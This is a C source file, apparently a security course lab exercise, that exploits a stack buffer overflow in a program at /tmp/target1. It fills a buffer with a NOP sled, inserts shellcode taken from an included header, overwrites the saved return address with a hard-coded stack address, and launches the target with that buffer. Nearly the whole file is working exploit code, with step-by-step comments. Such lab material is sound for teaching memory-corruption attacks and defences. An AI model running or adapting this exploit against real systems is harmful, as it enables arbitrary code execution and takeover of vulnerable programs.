#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define NOOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[248];

  //Steps
  //1. add noop sled so that eip falls into noop for safe landing
  memset(buf, NOOP, 200);

  //2. add shellcode from alephone 
  strncpy(buf + 180, shellcode, 45);

  //3. overwrite the eip so that it points to somewhere in noop. we got this from esp/epb of foo where buffer is allocated 
  strncpy(buf + 244, "\x08", 1);
  strncpy(buf + 245, "\xfd", 1);
  strncpy(buf + 246, "\xff", 1);
  strncpy(buf + 247, "\xbf", 1);
  
  //4. send the attack buffer to target
  args[0] = TARGET; 
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}